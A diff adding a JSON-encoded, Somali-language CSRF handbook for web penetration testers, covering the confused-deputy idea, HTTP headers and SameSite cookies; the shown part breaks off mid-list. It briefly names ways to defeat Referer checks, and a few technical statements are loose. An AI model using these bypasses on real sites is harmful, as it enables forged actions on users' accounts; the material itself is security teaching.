@@ -1,0 +1,5856 @@
+{
+ "title": "CSRF Handbook",
+ "source": "csrf_copy.docx",
+ "parts": [
+  {
+   "title": "HORDHAC BUUGGA",
+   "blocks": [
+    {
+     "type": "para",
+     "html": "Buuggu wuxuu ka koobnaan doonaa qaybahan:",
+     "text": "Buuggu wuxuu ka koobnaan doonaa qaybahan:",
+     "id": "part-intro-b0"
+    },
+    {
+     "type": "para",
+     "html": "<strong>QAYBTA I — FALSAFADDA CSRF</strong> <strong>QAYBTA II — HTTP: AASAASKA </strong><strong>QAYBTA III — ANATOMY OF CSRF</strong><strong>QAYBTA IV — DEFENSES </strong><strong>QAYBTA V — BILOW: LABS-KA FUDUD</strong><strong>QAYBTA VI — DHEXDHEXAAD: BYPASSES</strong><strong>QAYBTA VII — SARE: SAME-SITE, WEBSOCKET, IYO BEYOND</strong><strong>QAYBTA VIII — HABKA BUG HUNTER-KA</strong><strong>QAYBTA IX — WARBIXINTA IYO MUSTAQBALKA</strong>",
+     "text": "QAYBTA I — FALSAFADDA CSRF QAYBTA II — HTTP: AASAASKA QAYBTA III — ANATOMY OF CSRFQAYBTA IV — DEFENSES QAYBTA V — BILOW: LABS-KA FUDUDQAYBTA VI — DHEXDHEXAAD: BYPASSESQAYBTA VII — SARE: SAME-SITE, WEBSOCKET, IYO BEYONDQAYBTA VIII — HABKA BUG HUNTER-KAQAYBTA IX — WARBIXINTA IYO MUSTAQBALKA",
+     "id": "part-intro-b1"
+    }
+   ],
+   "id": "part-intro",
+   "index": 0
+  },
+  {
+   "title": "QAYBTA I — FALSAFADDA CSRF",
+   "blocks": [
+    {
+     "type": "para",
+     "html": "Aan ku bilowno su'aal fudud oo aan la weydiin:",
+     "text": "Aan ku bilowno su'aal fudud oo aan la weydiin:",
+     "id": "part-1-b0"
+    },
+    {
+     "type": "para",
+     "html": "Markaad bangigaaga gasho, browser-kaagu wuxuu hayaa cookie yar oo la yiraahdo <code>session</code>. Cookie-gaas wuxuu yiraahdaa: \"Kani waa Axmed.\" Server-ku wuu aqbalayaa. Waxba lama weydiiyo. Ma jiro sawir, ma jiro cod, ma jiro wax. Kaliya cookie.",
+     "text": "Markaad bangigaaga gasho, browser-kaagu wuxuu hayaa cookie yar oo la yiraahdo session. Cookie-gaas wuxuu yiraahdaa: \"Kani waa Axmed.\" Server-ku wuu aqbalayaa. Waxba lama weydiiyo. Ma jiro sawir, ma jiro cod, ma jiro wax. Kaliya cookie.",
+     "id": "part-1-b1"
+    },
+    {
+     "type": "para",
+     "html": "Hadda, aan is weydiino su'aal qoto dheer:",
+     "text": "Hadda, aan is weydiino su'aal qoto dheer:",
+     "id": "part-1-b2"
+    },
+    {
+     "type": "para",
+     "html": "<strong>Cookie-gaas ma caddaynayaa in \"adiga\" aad tahay adiga?</strong><strong> </strong><strong>Mise wuxuu caddaynayaa kaliya in browser-kaagu hayo cookie-gaas?</strong>",
+     "text": "Cookie-gaas ma caddaynayaa in \"adiga\" aad tahay adiga? Mise wuxuu caddaynayaa kaliya in browser-kaagu hayo cookie-gaas?",
+     "id": "part-1-b3"
+    },
+    {
+     "type": "para",
+     "html": "Halkan ayey CSRF ku dhalatay..",
+     "text": "Halkan ayey CSRF ku dhalatay..",
+     "id": "part-1-b4"
+    },
+    {
+     "type": "pseudoheading",
+     "html": "<strong>HTTP iyo Statelessness:</strong>",
+     "text": "HTTP iyo Statelessness:",
+     "id": "part-1-b5",
+     "slug": "http-iyo-statelessness"
+    },
+    {
+     "type": "para",
+     "html": "Si aad u fahanto CSRF, waa in aad fahanto <strong>HTTP</strong>. HTTP waa <strong>stateless protocol</strong>. Erayga \"stateless\" macneheedu waa: <strong>HTTP ma xasuusto wax</strong>. Request kastaa waa qof cusub oo aan la aqoon. Request kastaa waa \"stranger\" server-ka.",
+     "text": "Si aad u fahanto CSRF, waa in aad fahanto HTTP. HTTP waa stateless protocol. Erayga \"stateless\" macneheedu waa: HTTP ma xasuusto wax. Request kastaa waa qof cusub oo aan la aqoon. Request kastaa waa \"stranger\" server-ka.",
+     "id": "part-1-b6"
+    },
+    {
+     "type": "para",
+     "html": "Tusaale:",
+     "text": "Tusaale:",
+     "id": "part-1-b7"
+    },
+    {
+     "type": "list",
+     "ordered": false,
+     "items": [
+      {
+       "html": "Request 1: <code>GET /login</code> — server-ku wuu ku garanayaa.",
+       "text": "Request 1: GET /login — server-ku wuu ku garanayaa.",
+       "level": 0
+      },
+      {
+       "html": "Request 2: <code>POST /login</code> — server-ku wuu ku garanayaa.",
+       "text": "Request 2: POST /login — server-ku wuu ku garanayaa.",
+       "level": 0
+      },
+      {
+       "html": "Request 3: <code>GET /my-account</code> — <strong>server-ku ma garanayo ciddaad tahay</strong>. Waa qof cusub.",
+       "text": "Request 3: GET /my-account — server-ku ma garanayo ciddaad tahay. Waa qof cusub.",
+       "level": 0
+      }
+     ],
+     "id": "part-1-b8"
+    },
+    {
+     "type": "para",
+     "html": "HTTP laftiisu wuxuu leeyahay <strong>amnesia</strong>. Wuxuu illoobaa request kasta ka dib.",
+     "text": "HTTP laftiisu wuxuu leeyahay amnesia. Wuxuu illoobaa request kasta ka dib.",
+     "id": "part-1-b9"
+    },
+    {
+     "type": "para",
+     "html": "Marka waxaa la alifay <strong>cookies</strong>.",
+     "text": "Marka waxaa la alifay cookies.",
+     "id": "part-1-b10"
+    },
+    {
+     "type": "para",
+     "html": "Cookie waa <strong>badge</strong> yar oo browser-kaagu hayo. Markaad login sameyso, server-ku wuxuu ku siiyaa badge: <code>session=ABC123</code>. Browser-kaagu wuxuu badge-kaas u diraa request kasta oo u socda domain-kaas.",
+     "text": "Cookie waa badge yar oo browser-kaagu hayo. Markaad login sameyso, server-ku wuxuu ku siiyaa badge: session=ABC123. Browser-kaagu wuxuu badge-kaas u diraa request kasta oo u socda domain-kaas.",
+     "id": "part-1-b11"
+    },
+    {
+     "type": "pseudoheading",
+     "html": "<strong> Dhibaatada </strong>",
+     "text": "Dhibaatada",
+     "id": "part-1-b12",
+     "slug": "dhibaatada"
+    },
+    {
+     "type": "para",
+     "html": "Halkan ayey wax walba ka xumaadaan. Browser-kaagu waa <strong>confused deputy</strong>.",
+     "text": "Halkan ayey wax walba ka xumaadaan. Browser-kaagu waa confused deputy.",
+     "id": "part-1-b13"
+    },
+    {
+     "type": "para",
+     "html": "Erayga \"confused deputy\" wuxuu la micno yahay: <strong>qof awood leh oo aan garanayn cidda uu u shaqeynayo</strong>.",
+     "text": "Erayga \"confused deputy\" wuxuu la micno yahay: qof awood leh oo aan garanayn cidda uu u shaqeynayo.",
+     "id": "part-1-b14"
+    },
+    {
+     "type": "para",
+     "html": "Browser-kaagu wuxuu hayaa cookies badan oo domains badan. Wuxuu hayaa:",
+     "text": "Browser-kaagu wuxuu hayaa cookies badan oo domains badan. Wuxuu hayaa:",
+     "id": "part-1-b15"
+    },
+    {
+     "type": "list",
+     "ordered": false,
+     "items": [
+      {
+       "html": "<code>session</code> cookie-ga bangigaaga.",
+       "text": "session cookie-ga bangigaaga.",
+       "level": 0
+      },
+      {
+       "html": "<code>session</code> cookie-ga email-kaaga.",
+       "text": "session cookie-ga email-kaaga.",
+       "level": 0
+      },
+      {
+       "html": "<code>session</code> cookie-ga shirkaddaada.",
+       "text": "session cookie-ga shirkaddaada.",
+       "level": 0
+      },
+      {
+       "html": "iwm.",
+       "text": "iwm.",
+       "level": 0
+      }
+     ],
+     "id": "part-1-b16"
+    },
+    {
+     "type": "para",
+     "html": "Marka request uu yimaado, browser-kaagu wuxuu diraa cookies-ka <strong>domain-ka la codsaday</strong>. Ma weydiiyo: \"Yaa request-kan bilaabay?\" Wuxuu weydiiyaa kaliya: \"Domain-kee ayaa la codsaday?\"",
+     "text": "Marka request uu yimaado, browser-kaagu wuxuu diraa cookies-ka domain-ka la codsaday. Ma weydiiyo: \"Yaa request-kan bilaabay?\" Wuxuu weydiiyaa kaliya: \"Domain-kee ayaa la codsaday?\"",
+     "id": "part-1-b17"
+    },
+    {
+     "type": "para",
+     "html": " Browser-kaagu wuxuu u shaqeeyaa <strong>domain-ka</strong>, uma shaqeeyo <strong>user-ka</strong>. Wuxuu yahay <strong>confused deputy</strong> — wuxuu hayaa awood (cookies), laakiin ma garanayo cidda uu u shaqeynayo.",
+     "text": "Browser-kaagu wuxuu u shaqeeyaa domain-ka, uma shaqeeyo user-ka. Wuxuu yahay confused deputy — wuxuu hayaa awood (cookies), laakiin ma garanayo cidda uu u shaqeynayo.",
+     "id": "part-1-b18"
+    },
+    {
+     "type": "para",
+     "html": "Marka attacker uu yiraahdo browser-ka victim: \"Dir request u socda bangiga\", browser-ku wuxuu diraa cookies-ka bangiga. Server-ku wuxuu u malaynayaa in victim isagu request-ka diray. Laakiin <strong>attacker ayaa diray</strong>.",
+     "text": "Marka attacker uu yiraahdo browser-ka victim: \"Dir request u socda bangiga\", browser-ku wuxuu diraa cookies-ka bangiga. Server-ku wuxuu u malaynayaa in victim isagu request-ka diray. Laakiin attacker ayaa diray.",
+     "id": "part-1-b19"
+    },
+    {
+     "type": "para",
+     "html": "<strong>CSRF waa exploit-ka confused deputy.</strong>",
+     "text": "CSRF waa exploit-ka confused deputy.",
+     "id": "part-1-b20"
+    },
+    {
+     "type": "para",
+     "html": "Aan si qoto dheer u dhuuxno. <strong>Maxay tahay trust?</strong>",
+     "text": "Aan si qoto dheer u dhuuxno. Maxay tahay trust?",
+     "id": "part-1-b21"
+    },
+    {
+     "type": "para",
+     "html": "Trust waa <strong>saadaalin</strong><strong> marka la joogo web pen testing</strong>. Markaad aaminsan tahay qof, waxaad saadaalinaysaa inuu sidaas sameyn doono. Server-ku wuxuu aaminsan yahay cookie-ga. Wuxuu saadaalinayaa: \"Haddii cookie-ga la soo diro, user-kaas ayaa request-ka diray.\"",
+     "text": "Trust waa saadaalin marka la joogo web pen testing. Markaad aaminsan tahay qof, waxaad saadaalinaysaa inuu sidaas sameyn doono. Server-ku wuxuu aaminsan yahay cookie-ga. Wuxuu saadaalinayaa: \"Haddii cookie-ga la soo diro, user-kaas ayaa request-ka diray.\"",
+     "id": "part-1-b22"
+    },
+    {
+     "type": "para",
+     "html": "Laakiin <strong>trust</strong> Waa <strong>assumption</strong>. CSRF wuxuu ka faa'iidaystaa male-awaalkaas.",
+     "text": "Laakiin trust Waa assumption. CSRF wuxuu ka faa'iidaystaa male-awaalkaas.",
+     "id": "part-1-b23"
+    },
+    {
+     "type": "para",
+     "html": "Server-ku wuxuu isku darayaa <strong>identity</strong>  iyo <strong>authorization</strong> . Wuxuu u malaynayaa: \"Haddii aan ku aqoonsado, fasax ayaad haystaa.\" ",
+     "text": "Server-ku wuxuu isku darayaa identity  iyo authorization . Wuxuu u malaynayaa: \"Haddii aan ku aqoonsado, fasax ayaad haystaa.\"",
+     "id": "part-1-b24"
+    },
+    {
+     "type": "para",
+     "html": "CSRF wuxuu ka faa'iidaystaa khaladkan falsafadeed.",
+     "text": "CSRF wuxuu ka faa'iidaystaa khaladkan falsafadeed.",
+     "id": "part-1-b25"
+    },
+    {
+     "type": "pseudoheading",
+     "html": "<strong>Mental Model</strong>",
+     "text": "Mental Model",
+     "id": "part-1-b26",
+     "slug": "mental-model"
+    },
+    {
+     "type": "para",
+     "html": "Hadda aan isku dhisno <strong>mental model</strong> oo aad isticmaali doonto lab kasta.",
+     "text": "Hadda aan isku dhisno mental model oo aad isticmaali doonto lab kasta.",
+     "id": "part-1-b27"
+    },
+    {
+     "type": "pseudoheading",
+     "html": "<strong>Model-ka waa sidan:</strong>",
+     "text": "Model-ka waa sidan:",
+     "id": "part-1-b28",
+     "slug": "model-ka-waa-sidan"
+    },
+    {
+     "type": "code",
+     "lang": "text",
+     "lines": [
+      "VICTIM (User)",
+      "    │",
+      "    │ (1) Login → Server-ku wuxuu siiyaa cookie",
+      "    │",
+      "    ▼",
+      "BROWSER (Confused Deputy)",
+      "    │",
+      "    │ (2) Wuxuu hayaa cookie-ga",
+      "    │",
+      "    ├───── (3a) Victim wuxuu booqdaa website kale",
+      "    │",
+      "    │ (3b) Website-kaas wuxuu leeyahay form/script",
+      "    │",
+      "    │ (4) Browser-ku wuxuu diraa request-ka",
+      "    │     isagoo wata cookie-ga victim",
+      "    │",
+      "    ▼",
+      "SERVER (Trusting)",
+      "    │",
+      "    │ (5) Server-ku wuxuu arkaa cookie-ga",
+      "    │     Wuxuu u malaynayaa in victim request-ka diray",
+      "    │",
+      "    │ (6) Server-ku wuxuu sameeyaa action-ka",
+      "    │",
+      "    ▼",
+      "ACTION (Change email, transfer, iwm)"
+     ],
+     "id": "part-1-b29"
+    },
+    {
+     "type": "pseudoheading",
+     "html": "<strong>muxuu</strong><strong> CSRF u jir</strong><strong>aa?</strong>",
+     "text": "muxuu CSRF u jiraa?",
+     "id": "part-1-b30",
+     "slug": "muxuu-csrf-u-jiraa"
+    },
+    {
+     "type": "para",
+     "html": "CSRF wuxuu u jiraa  <strong>saddex</strong><strong> waxyaabood oo aan laga baxsan karin</strong>:",
+     "text": "CSRF wuxuu u jiraa  saddex waxyaabood oo aan laga baxsan karin:",
+     "id": "part-1-b31"
+    },
+    {
+     "type": "para",
+     "html": "<strong>1. HTTP waa stateless.</strong> Waa in la isticmaalaa cookies si loo hayo state. Tani waa <strong>aasaas</strong>. Lama beddeli karo.",
+     "text": "1. HTTP waa stateless. Waa in la isticmaalaa cookies si loo hayo state. Tani waa aasaas. Lama beddeli karo.",
+     "id": "part-1-b32"
+    },
+    {
+     "type": "para",
+     "html": "<strong>2. Browser-ku wuxuu diraa cookies si toos ah.</strong> Waa in browser-ku u shaqeeyaa sidaas si loo fududeeyo isticmaalka. Tani waa <strong>convenience</strong>. Waa trade-off.",
+     "text": "2. Browser-ku wuxuu diraa cookies si toos ah. Waa in browser-ku u shaqeeyaa sidaas si loo fududeeyo isticmaalka. Tani waa convenience. Waa trade-off.",
+     "id": "part-1-b33"
+    },
+    {
+     "type": "para",
+     "html": "<strong>3. Web-ku wuxuu leeyahay cross-origin requests.</strong> Waa in website-ku u ogolaadaa requests kale (images, scripts, iwm). Tani waa <strong>interoperability</strong>. Waa aasaas.",
+     "text": "3. Web-ku wuxuu leeyahay cross-origin requests. Waa in website-ku u ogolaadaa requests kale (images, scripts, iwm). Tani waa interoperability. Waa aasaas.",
+     "id": "part-1-b34"
+    },
+    {
+     "type": "para",
+     "html": "<strong>Saddexdan isku darkooda</strong> waxay abuuraan CSRF. Lama tirtiri karo midkoodna..",
+     "text": "Saddexdan isku darkooda waxay abuuraan CSRF. Lama tirtiri karo midkoodna..",
+     "id": "part-1-b35"
+    }
+   ],
+   "id": "part-1",
+   "index": 1
+  },
+  {
+   "title": "QAYBTA II — HTTP",
+   "blocks": [
+    {
+     "type": "heading",
+     "level": 3,
+     "html": "HTTP Request: Anatomy",
+     "text": "HTTP Request: Anatomy",
+     "id": "part-2-b0",
+     "slug": "http-request-anatomy"
+    },
+    {
+     "type": "para",
+     "html": "Aan bilowno request fudud. Markaad <code>POST /login</code> sameyso, HTTP request-ku wuxuu u eg yahay sidan:",
+     "text": "Aan bilowno request fudud. Markaad POST /login sameyso, HTTP request-ku wuxuu u eg yahay sidan:",
+     "id": "part-2-b1"
+    },
+    {
+     "type": "code",
+     "lang": "text",
+     "lines": [
+      "POST /login HTTP/1.1",
+      "Host: target.com",
+      "User-Agent: Mozilla/5.0",
+      "Content-Type: application/x-www-form-urlencoded",
+      "Content-Length: 28",
+      "Cookie: session=ABC123",
+      "Referer: https://target.com/login",
+      "Origin: https://target.com",
+      "",
+      "username=wiener&password=peter"
+     ],
+     "id": "part-2-b2"
+    },
+    {
+     "type": "para",
+     "html": "Aan kala baxno qayb kasta. Qayb kastaa waxay leedahay macne ",
+     "text": "Aan kala baxno qayb kasta. Qayb kastaa waxay leedahay macne",
+     "id": "part-2-b3"
+    },
+    {
+     "type": "heading",
+     "level": 4,
+     "html": "Request Line: <code>POST /login HTTP/1.1</code>",
+     "text": "Request Line: POST /login HTTP/1.1",
+     "id": "part-2-b4",
+     "slug": "request-line-post-login-http-1-1"
+    },
+    {
+     "type": "para",
+     "html": "Qaybta 1: Method — <code>POST</code>Qaybta 2: Path — <code>/login</code>Qaybta 3: Version — <code>HTTP/1.1</code>",
+     "text": "Qaybta 1: Method — POSTQaybta 2: Path — /loginQaybta 3: Version — HTTP/1.1",
+     "id": "part-2-b5"
+    },
+    {
+     "type": "para",
+     "html": "Method-ku wuxuu sheegaa ujeedda. Wuxuu yiraahdaa: \"Waxaan rabaa inaan sameeyo wax.\" <code>GET</code> wuxuu yiraahdaa: \"Waxaan rabaa inaan akhriyo.\" <code>POST</code> wuxuu yiraahdaa: \"Waxaan rabaa inaan beddelo.\" <code>PUT</code> wuxuu yiraahdaa: \"Waxaan rabaa inaan abuuro.\" <code>DELETE</code> wuxuu yiraahdaa: \"Waxaan rabaa inaan tirtiro.\"",
+     "text": "Method-ku wuxuu sheegaa ujeedda. Wuxuu yiraahdaa: \"Waxaan rabaa inaan sameeyo wax.\" GET wuxuu yiraahdaa: \"Waxaan rabaa inaan akhriyo.\" POST wuxuu yiraahdaa: \"Waxaan rabaa inaan beddelo.\" PUT wuxuu yiraahdaa: \"Waxaan rabaa inaan abuuro.\" DELETE wuxuu yiraahdaa: \"Waxaan rabaa inaan tirtiro.\"",
+     "id": "part-2-b6"
+    },
+    {
+     "type": "para",
+     "html": "Method-ku waa state-changing mise safe? Haddii method-ku yahay <code>GET</code> oo uu beddelo state, waa khalad. Haddii method-ku yahay <code>POST</code> oo uu beddelo state, waa sax. Laakiin attacker-ku wuxuu isku dayaa inuu <code>POST</code> u beddelo <code>GET</code> sababtoo ah SameSite=Lax ma diro <code>POST</code> cross-site.",
+     "text": "Method-ku waa state-changing mise safe? Haddii method-ku yahay GET oo uu beddelo state, waa khalad. Haddii method-ku yahay POST oo uu beddelo state, waa sax. Laakiin attacker-ku wuxuu isku dayaa inuu POST u beddelo GET sababtoo ah SameSite=Lax ma diro POST cross-site.",
+     "id": "part-2-b7"
+    },
+    {
+     "type": "para",
+     "html": "Marka aad aragto <code>GET /change-email</code>, is weydii: \"muxuu server-ku u ogolaaday GET inuu beddelo state?\" Tani waa red flag.",
+     "text": "Marka aad aragto GET /change-email, is weydii: \"muxuu server-ku u ogolaaday GET inuu beddelo state?\" Tani waa red flag.",
+     "id": "part-2-b8"
+    },
+    {
+     "type": "heading",
+     "level": 4,
+     "html": "Host Header: <code>Host: target.com</code>",
+     "text": "Host Header: Host: target.com",
+     "id": "part-2-b9",
+     "slug": "host-header-host-target-com"
+    },
+    {
+     "type": "para",
+     "html": "Host header-ku wuxuu sheegaa domain-ka la codsaday..",
+     "text": "Host header-ku wuxuu sheegaa domain-ka la codsaday..",
+     "id": "part-2-b10"
+    },
+    {
+     "type": "para",
+     "html": "Host header-ku wuxuu ku xiran yahay SameSite. Marka browser-ku uu diro request, wuxuu eegaa Host header-ka si uu u garto in request-ku yahay same-site mise cross-site.",
+     "text": "Host header-ku wuxuu ku xiran yahay SameSite. Marka browser-ku uu diro request, wuxuu eegaa Host header-ka si uu u garto in request-ku yahay same-site mise cross-site.",
+     "id": "part-2-b11"
+    },
+    {
+     "type": "heading",
+     "level": 4,
+     "html": "Cookie Header: <code>Cookie: session=ABC123</code>",
+     "text": "Cookie Header: Cookie: session=ABC123",
+     "id": "part-2-b12",
+     "slug": "cookie-header-cookie-session-abc123"
+    },
+    {
+     "type": "para",
+     "html": "Cookie header-ku wuxuu sheegaa badge-ka user-ka..",
+     "text": "Cookie header-ku wuxuu sheegaa badge-ka user-ka..",
+     "id": "part-2-b13"
+    },
+    {
+     "type": "heading",
+     "level": 4,
+     "html": " Referer Header: <code>Referer: https://target.com/login</code>",
+     "text": "Referer Header: Referer: https://target.com/login",
+     "id": "part-2-b14",
+     "slug": "referer-header-referer-https-target-com-login"
+    },
+    {
+     "type": "para",
+     "html": "Referer header-ku wuxuu sheegaa bogga request-ku ka yimid. Waa context.",
+     "text": "Referer header-ku wuxuu sheegaa bogga request-ku ka yimid. Waa context.",
+     "id": "part-2-b15"
+    },
+    {
+     "type": "para",
+     "html": "Referer waa defense oo jaban. Server-ku wuxuu xaqiijin karaa Referer, laakiin attacker-ku wuxuu tirtiri karaa (<code>no-referrer</code>) ama wuxuu khiyaanayn karaa (<code>unsafe-url</code> + <code>history.pushState</code>).",
+     "text": "Referer waa defense oo jaban. Server-ku wuxuu xaqiijin karaa Referer, laakiin attacker-ku wuxuu tirtiri karaa (no-referrer) ama wuxuu khiyaanayn karaa (unsafe-url + history.pushState).",
+     "id": "part-2-b16"
+    },
+    {
+     "type": "heading",
+     "level": 4,
+     "html": "2.2.5 Origin Header: <code>Origin: https://target.com</code>",
+     "text": "2.2.5 Origin Header: Origin: https://target.com",
+     "id": "part-2-b17",
+     "slug": "2-2-5-origin-header-origin-https-target-com"
+    },
+    {
+     "type": "para",
+     "html": "Origin header-ku wuxuu sheegaa origin-ka request-ku ka yimid. Waa scheme + host + port.",
+     "text": "Origin header-ku wuxuu sheegaa origin-ka request-ku ka yimid. Waa scheme + host + port.",
+     "id": "part-2-b18"
+    },
+    {
+     "type": "para",
+     "html": "Origin waa defense awood leh haddii loo isticmaalo si sax ah. Laakiin server-ku.",
+     "text": "Origin waa defense awood leh haddii loo isticmaalo si sax ah. Laakiin server-ku.",
+     "id": "part-2-b19"
+    },
+    {
+     "type": "heading",
+     "level": 4,
+     "html": "Body: <code>username=wiener&amp;password=peter</code>",
+     "text": "Body: username=wiener&password=peter",
+     "id": "part-2-b20",
+     "slug": "body-username-wiener-password-peter"
+    },
+    {
+     "type": "para",
+     "html": "Body-ga wuxuu sheegaa xogta la dirayo. Waa payload.",
+     "text": "Body-ga wuxuu sheegaa xogta la dirayo. Waa payload.",
+     "id": "part-2-b21"
+    },
+    {
+     "type": "para",
+     "html": "Body-ga wuxuu ku jiraa <code>csrf</code> token. Haddii token-ka maqan yahay, waa red flag. Haddii token-ka jiro laakiin aan la xaqiijin, waa red flag.",
+     "text": "Body-ga wuxuu ku jiraa csrf token. Haddii token-ka maqan yahay, waa red flag. Haddii token-ka jiro laakiin aan la xaqiijin, waa red flag.",
+     "id": "part-2-b22"
+    },
+    {
+     "type": "heading",
+     "level": 3,
+     "html": "2.3 HTTP Response: Anatomy",
+     "text": "2.3 HTTP Response: Anatomy",
+     "id": "part-2-b23",
+     "slug": "2-3-http-response-anatomy"
+    },
+    {
+     "type": "para",
+     "html": "Response-ku wuxuu u eg yahay sidan:",
+     "text": "Response-ku wuxuu u eg yahay sidan:",
+     "id": "part-2-b24"
+    },
+    {
+     "type": "code",
+     "lang": "text",
+     "lines": [
+      "HTTP/1.1 200 OK",
+      "Content-Type: text/html",
+      "Set-Cookie: session=ABC123; SameSite=Strict; Secure; HttpOnly",
+      "Content-Length: 1234",
+      "X-Frame-Options: DENY",
+      "",
+      "<html>...</html>"
+     ],
+     "id": "part-2-b25"
+    },
+    {
+     "type": "heading",
+     "level": 4,
+     "html": "Status Code: <code>200 OK</code>",
+     "text": "Status Code: 200 OK",
+     "id": "part-2-b26",
+     "slug": "status-code-200-ok"
+    },
+    {
+     "type": "para",
+     "html": "Status code-ku wuxuu sheegaa natiijada. <code>200</code> waaOK. <code>302</code> waa redirect. <code>400</code> waa khalad. <code>403</code> waa diidmo.",
+     "text": "Status code-ku wuxuu sheegaa natiijada. 200 waaOK. 302 waa redirect. 400 waa khalad. 403 waa diidmo.",
+     "id": "part-2-b27"
+    },
+    {
+     "type": "para",
+     "html": "Marka aad tijaabinayso CSRF, status code-ku wuxuu kuu sheegaa in request-ka la aqbalay. <code>200</code> waa success. <code>400</code> waa failure.",
+     "text": "Marka aad tijaabinayso CSRF, status code-ku wuxuu kuu sheegaa in request-ka la aqbalay. 200 waa success. 400 waa failure.",
+     "id": "part-2-b28"
+    },
+    {
+     "type": "heading",
+     "level": 4,
+     "html": "Set-Cookie: <code>Set-Cookie: session=ABC123; SameSite=Strict</code>",
+     "text": "Set-Cookie: Set-Cookie: session=ABC123; SameSite=Strict",
+     "id": "part-2-b29",
+     "slug": "set-cookie-set-cookie-session-abc123-samesite-strict"
+    },
+    {
+     "type": "para",
+     "html": "Set-Cookie header-ku wuxuu sheegaa cookie cusub. Waa aasaas CSRF defense.",
+     "text": "Set-Cookie header-ku wuxuu sheegaa cookie cusub. Waa aasaas CSRF defense.",
+     "id": "part-2-b30"
+    },
+    {
+     "type": "para",
+     "html": "Attributes:",
+     "text": "Attributes:",
+     "id": "part-2-b31"
+    },
+    {
+     "type": "list",
+     "ordered": false,
+     "items": [
+      {
+       "html": "<code>SameSite=Strict|Lax|None</code> — xaddida cross-site.",
+       "text": "SameSite=Strict|Lax|None — xaddida cross-site.",
+       "level": 0
+      },
+      {
+       "html": "<code>Secure</code> — kaliya HTTPS.",
+       "text": "Secure — kaliya HTTPS.",
+       "level": 0
+      },
+      {
+       "html": "<code>HttpOnly</code> — JavaScript ma akhriyi karo.",
+       "text": "HttpOnly — JavaScript ma akhriyi karo.",
+       "level": 0
+      },
+      {
+       "html": "<code>Domain</code> — domain-ka cookie-ga.",
+       "text": "Domain — domain-ka cookie-ga.",
+       "level": 0
+      },
+      {
+       "html": "<code>Path</code> — path-ka cookie-ga.",
+       "text": "Path — path-ka cookie-ga.",
+       "level": 0
+      },
+      {
+       "html": "<code>Expires</code>/<code>Max-Age</code> — goorta uu dhamaado.",
+       "text": "Expires/Max-Age — goorta uu dhamaado.",
+       "level": 0
+      }
+     ],
+     "id": "part-2-b32"
+    },
+    {
+     "type": "para",
+     "html": "SameSite waa defense ugu muhiimsan. Haddii aan la dhigin, browser-ku wuxuu isticmaalaa default Lax (Chrome). Haddii <code>SameSite=Strict</code><code> yahay</code>, CSRF waa mid adag. Haddii <code>SameSite=None</code>, CSRF waa mid fudud.",
+     "text": "SameSite waa defense ugu muhiimsan. Haddii aan la dhigin, browser-ku wuxuu isticmaalaa default Lax (Chrome). Haddii SameSite=Strict yahay, CSRF waa mid adag. Haddii SameSite=None, CSRF waa mid fudud.",
+     "id": "part-2-b33"
+    },
+    {
+     "type": "heading",
+     "level": 4,
+     "html": "X-Frame-Options: <code>X-Frame-Options: DENY</code>",
+     "text": "X-Frame-Options: X-Frame-Options: DENY",
+     "id": "part-2-b34",
+     "slug": "x-frame-options-x-frame-options-deny"
+    },
+    {
+     "type": "para",
+     "html": "X-Frame-Options wuxuu sheegaa in bogga aan la geli karin iframe. Waa clickjacking defense.",
+     "text": "X-Frame-Options wuxuu sheegaa in bogga aan la geli karin iframe. Waa clickjacking defense.",
+     "id": "part-2-b35"
+    },
+    {
+     "type": "para",
+     "html": ".",
+     "text": ".",
+     "id": "part-2-b36"
+    },
+    {
+     "type": "para",
+     "html": "Haddii X-Frame-Options maqan yahay, clickjacking waa possible. Clickjacking waa CSRF nooc kale — attacker wuxuu ku qasbaa victim inuu riixo button.2.4.2 SameSite: Falsafadda",
+     "text": "Haddii X-Frame-Options maqan yahay, clickjacking waa possible. Clickjacking waa CSRF nooc kale — attacker wuxuu ku qasbaa victim inuu riixo button.2.4.2 SameSite: Falsafadda",
+     "id": "part-2-b37"
+    },
+    {
+     "type": "para",
+     "html": "SameSite waa defense ugu muhiimsan ee CSRF. Wuxuu leeyahay saddex qiime:",
+     "text": "SameSite waa defense ugu muhiimsan ee CSRF. Wuxuu leeyahay saddex qiime:",
+     "id": "part-2-b38"
+    },
+    {
+     "type": "para",
+     "html": "1. SameSite=Strict",
+     "text": "1. SameSite=Strict",
+     "id": "part-2-b39"
+    },
+    {
+     "type": "code",
+     "lang": null,
+     "lines": [
+      "Cookie-ga lama diro cross-site haba ahaatee.",
+      "Xitaa top-level navigation, xitaa GET."
+     ],
+     "id": "part-2-b40"
+    },
+    {
+     "type": "para",
+     "html": "Strict waa isolation. Wuxuu yiraahdaa: \"Cookie-ga waa qarsoodi. Lama wadaago.\"",
+     "text": "Strict waa isolation. Wuxuu yiraahdaa: \"Cookie-ga waa qarsoodi. Lama wadaago.\"",
+     "id": "part-2-b41"
+    },
+    {
+     "type": "para",
+     "html": "2. SameSite=Lax",
+     "text": "2. SameSite=Lax",
+     "id": "part-2-b42"
+    },
+    {
+     "type": "code",
+     "lang": null,
+     "lines": [
+      "Cookie-ga waa la diraa cross-site kaliya haddii:",
+      "- Request-ku yahay GET",
+      "- Request-ku yahay top-level navigation"
+     ],
+     "id": "part-2-b43"
+    },
+    {
+     "type": "para",
+     "html": "3. SameSite=None",
+     "text": "3. SameSite=None",
+     "id": "part-2-b44"
+    },
+    {
+     "type": "code",
+     "lang": null,
+     "lines": [
+      "Cookie-ga waa la diraa cross-site had iyo jeer.",
+      "Waa in la daro Secure."
+     ],
+     "id": "part-2-b45"
+    },
+    {
+     "type": "heading",
+     "level": 4,
+     "html": "Top-Level Navigation vs Subresource",
+     "text": "Top-Level Navigation vs Subresource",
+     "id": "part-2-b46",
+     "slug": "top-level-navigation-vs-subresource"
+    },
+    {
+     "type": "para",
+     "html": "Top-level navigation waa marka browser-ku uu si toos ah ugu leexdo URL cusub:",
+     "text": "Top-level navigation waa marka browser-ku uu si toos ah ugu leexdo URL cusub:",
+     "id": "part-2-b47"
+    },
+    {
+     "type": "code",
+     "lang": null,
+     "lines": [
+      "document.location = \"https://...\""
+     ],
+     "id": "part-2-b48"
+    },
+    {
+     "type": "list",
+     "ordered": false,
+     "items": [
+      {
+       "html": "<code>&lt;a href=\"https://...\"&gt;</code> oo la riixo",
+       "text": "<a href=\"https://...\"> oo la riixo",
+       "level": 0
+      },
+      {
+       "html": "<code>&lt;form action=\"https://...\"&gt;</code> oo la submit-gareeyo",
+       "text": "<form action=\"https://...\"> oo la submit-gareeyo",
+       "level": 0
+      }
+     ],
